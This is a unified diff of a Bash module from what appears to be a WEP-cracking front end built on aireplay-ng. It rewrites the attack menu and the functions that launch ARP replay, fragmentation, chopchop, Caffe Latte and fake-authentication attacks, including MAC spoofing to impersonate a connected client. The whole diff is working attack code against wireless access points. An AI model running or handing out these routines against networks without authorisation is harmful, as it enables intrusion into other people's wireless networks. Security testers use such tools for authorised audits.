@@ -16,164 +16,121 @@
 
 # Warning! at least generic, internal and interface must be loaded before this one!
 
-check_function fakeauth3 || source $path/attacks/auth # It depends on auth module ;)
+check_function auth_attacks_fake || source $path/attacks/auth # It depends on auth module ;)
 check_function injectmenu || source $path/attacks/injection # It depends on injection module ;)
 
 check_client(){
-    [[ $Client_MAC ]] && {
-         return 0;
-     } || {
-         $clear; error "You have not selected a client"; return 20
-     }
-}
-
-check_dump_xor(){
-    $DUMP_PATH/dump*xor && {
-        return 0;
-    } || {
-        $clear; error "You need to get a XOR packet. You can do it for example with a frag attack or a chopchop attack"; return 20
-    }
-
+	[[ $dynamic_client_selection ]] && { auto_scan_clients; select_client; }
+	[[ $Client_MAC != ""  ]] && { 
+		ifconfig $wificard hw ether $Client_MAC
+		directed=1; 
+		return 0; 
+	} || {
+		ifconfig $wificard hw ether $FAKE_MAC
+	}
 }
 
 wep_attacks_menu(){
-    while true; do $clear  
-        mkmenu "Wep Attacks"\
-            "Attacks not using a client"\
-            "Attacks using a client "\
-            "ARP inject from xor (PSK) "\
-            "Return to main menu "
+	help_fifo "${mark}${red}Wep attacks${end}\n"\
+		"You're seeing this menu because the network you selected has WEP encryption\n"\
+		"Here follows some information about each attack\n"\
+		"${red}ARP Replay${end}\n" \
+		"Standard arp replay, tries to capture an arp and send it back to the router to generate traffic. If not client selected, it'll launch a fake auth attack to simulate one \n"\
+		"${red}Fragmentation ${end}\n"\
+		"Initiates a fragmentation attack to obtain 1500 bytes of PRGA. Then it generates a packet and injects it back to the router.\n"\
+		"${red}ChopChop  ${end}\n"\
+		"Tries to decode a single wep packet via chopchop attack, then it starts an injection attack with that packet.\n"\
+		"${red}Caffe Latte${end}\n"\
+		"An attack not requering router to be in range, client-directed (useful if you're not close to the ap, but to a client)"
 
-        case $choice in
-            1) {
-                    mkmenu "Attacks not using a client"\
-                           "Fake auth => Automatic"\
-                           "Fake auth => Interactive"\
-                           "Fragmentation attack "\
-                           "Chopchop attack "\
-                           "Return to main menu"
 
-                    case $choice in
-                        1) wep_attacks fakeauto ; break ;;
-                        2) wep_attacks fakeinteractive; break ;;
-                        3) wep_attacks fragmentation NC ; break ;;
-                        4) wep_attacks chopchop; break ;;
-                        5) $clear; break ;;
-                        *) echo -e "`gettext \"Unknown response. Try again\"`" ;;
-                    esac
-            } ; break;;
-            2) {
-                    mkmenu "Attacks using a client"\
-                        "ARP replay => Automatic"\
-                        "ARP replay => Interactive"\
-                        "Fragmentation attack"\
-                        "Chopchop attack"\
-                        "Cafe latte"\
-                        "Return to main menu"
+    while true; do $clear 
+	    mkmenu "Attacks using a client"\
+            "ARP replay"\
+            "Fragmentation attack"\
+            "Chopchop attack"\
+            "Caffe latte"\
+            "Return to main menu"
 
-                case $choice in
-                    1) check_client && wep_attacks arpreplay_auto; break ;;
-                    2) check_client && wep_attacks arpreplay_interactive; break ;;
-                    3) check_client && wep_attacks fragmentation -7; break ;;  
-                    4) check_client && wep_attacks chopchopclient; break ;;
-                    5) check_client && wep_attacks caffelate; break ;;
-                    6) $clear; break ;;
-                    *) echo -e "`gettext \"Unknown response. Try again\"`" ;;
-                esac
-            } ; break;;
-            3) check_dump_xor && wep_attacks pskarp; break;;
-            4) $clear; break ;;
-            *) echo -e "`gettext \"Unknown response. Try again\"`" ;;
-        esac
+            case $choice in
+                1) check_client ;  wep_attacks arpreplay_interactive; break ;;
+                2) check_client ;  wep_attacks fragmentation -7; break ;;  
+                3) check_client ;  wep_attacks chopchop; break ;;
+                4) check_client ;  wep_attacks caffelate; break ;;
+                5) $clear; break ;;
+                *) echo -e "`gettext \"Unknown response. Try again\"`" ;;
+            esac
     done
 }
 
 wep_attacks(){
+    $clear
     attack=$1; shift;
+	hardclean replay_dec-*.xor
+    [[ $attack != menu ]] && { 
+		capture &
+	 }
     wep_attacks_$attack $@
     $clear;
 }
-
-wep_attacks_fakeauto(){
+interactive_wep(){
     if [ "$INTERACTIVE" == 1 ]; then
-        read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
-        if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
-
-        read -p "`gettext \"Enable From or To destination bit (f/t):  \"`" FT
-        if [ "$FT" = "" ]; then FT="f"; fi
-
-    else
-        INJMAC="FF:FF:FF:FF:FF:FF"
-        FT="f"
-    fi
-
-    capture & execute "Injection: Host: $Host_MAC" $AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86 -h $FAKE_MAC -x $INJECTRATE & choosefake 
-}
-
-wep_attacks_fakeinteractive(){
-    if [ "$INTERACTIVE" == "1" ]; then
-        read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
-        if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
-        read -p "`gettext \"Set framecontrol word (hex): (0841) \"`" FT
-        if [ "$FT" = "" ]; then FT="0841"; fi
-    else
-        INJMAC="FF:FF:FF:FF:FF:FF"
-        FT="0841"
-    fi
-    capture & execute  "Interactive Packet Sel on Host: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE & choosefake
+        read -p "`gettext 'Enter destination mac: (FF:FF:FF:FF:FF:FF)'`" INJMAC
+        if [ "$INJMAC" = "" ]; then INJMAC=$INJMAC_; fi
+        read -p "`gettext 'Set framecontrol word (hex): (0841) '`" FT
+        if [ "$FT" = "" ]; then FT=$FT_; fi
+    else INJMAC=$INJMAC_; FT=$FT_; fi
 }
 
 
 wep_attacks_caffelate(){
-    capture & execute  "Cafe Latte Attack on: $Host_SSID " $AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $iwifi & fakeauth3 
-}
-
-wep_attacks_arpreplay_auto(){
-    if [ "$INTERACTIVE" == "1" ]; then
-        read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
-        if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
-        read -p "`gettext 'Enable From or To destination bit (f/t):  '`" FT
-        if [ "$FT" = "" ]; then FT="f"; fi
-    else INJMAC="FF:FF:FF:FF:FF:FF"; FT="f"; fi
-    capture & execute "Injection in Host: $Host_MAC Client $Client_MAC" $AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE 
+	execute  "Cafe Latte Attack on: $Host_SSID "\
+	   	$AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x \
+		$INJECTRATE -D $iwifi & 
+	auth_attacks_fake 
 }
 
 wep_attacks_arpreplay_interactive(){
-    if [ "$INTERACTIVE" == 1 ]; then
-        read -p "`gettext 'Enter destination mac: (FF:FF:FF:FF:FF:FF)'`" INJMAC
-        if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
-        read -p "`gettext 'Set framecontrol word (hex): (0841) '`" FT
-        if [ "$FT" = "" ]; then FT="0841"; fi
-    else INJMAC="FF:FF:FF:FF:FF:FF"; FT="0841"; fi
-    capture & execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE 
+	FT_="0841"; INJMAC_="FF:FF:FF:FF:FF:FF"; interactive_wep;
+
+    if [[ $directed == 1 ]]; then
+		execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $Client_MAC -x $INJECTRATE 
+	else
+		auth_attacks_fake &
+		execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE 
+	fi
 }
 
 wep_attacks_fragmentation(){
     rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
-    killall -9 airodump-ng aireplay-ng 
-
-    if [ $1 ==  "NC" ]; then    
-        execute "Fragmentation w/o client" $AIREPLAY -5 -b $Host_MAC -h\
-            $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi & capture & choosefake &  injectmenu frag
+    killall -9 airodump-ng aireplay-ng
+    if [[ $directed != 1 ]]; then
+		auth_attacks_fake &
+        export wait_for_execute=1; execute "Fragmentation w/o client" $AIREPLAY -5 -b $Host_MAC -h\
+            $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi 
+		wait_for_execute=0;
     else
-        execute "Fragmentation attack" $AIREPLAY -7 -b $Host_MAC -h $Client_MAC\
-            -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi & capture &  injectmenu frag
+        wait_for_execute=1; execute "Fragmentation attack" $AIREPLAY -7 -b $Host_MAC -h $Client_MAC\
+            -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi  
+		wait_for_execute=0;
     fi
+	AUTO=1 injectmenu frag
 }
 
 wep_attacks_chopchop(){
-    $clear && hardclean  replay_dec-*.xor
-    capture &  fakeauth3 & 
-    execute "Chopchoping: $Host_MAC" $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi & injectmenu chopchop
-}
+    $clear
+	hardclean replay_dec-*.xor
 
-wep_attacks_chopchopclient(){
-    $clear && hardclean  replay_dec-*.xor
-    capture & execute "ChopChoping: $Host_SSID" $AIREPLAY --chopchop -h $Client_MAC $iwifi & injectmenu chopchop
-}
-
-wep_attacks_pskarp(){
-    rm -rf $DUMP_PATH/arp_*.cap
-    execute "Forging package" $ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
-    execute "PSK ARP Replaying" $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $iwifi 
+	[[ $directed != 1 ]] && {
+		auth_attacks_fake &
+		export wait_for_execute=1; execute "Chopchoping at $Host_SSID"\
+			$AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi  
+		export wait_for_execute=0;
+	} || {
+		export wait_for_execute=1; 
+		execute "Directed ChopChoping to $Client_MAC at $Host_SSID"\
+			$AIREPLAY  --chopchop -b $Host_MAC -h $Client_MAC $iwifi 
+		export wait_for_execute=0;
+	}
+	AUTO=1 injectmenu chopchop
 }
